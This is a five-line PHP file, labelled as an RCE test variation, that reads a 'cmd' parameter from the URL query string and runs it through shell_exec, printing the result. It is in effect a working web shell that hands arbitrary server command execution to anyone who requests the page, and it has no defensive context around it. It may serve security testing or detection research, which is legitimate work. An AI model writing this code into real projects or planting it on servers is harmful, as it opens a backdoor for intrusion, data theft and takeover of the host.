<?php
// RCE test variation #532
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>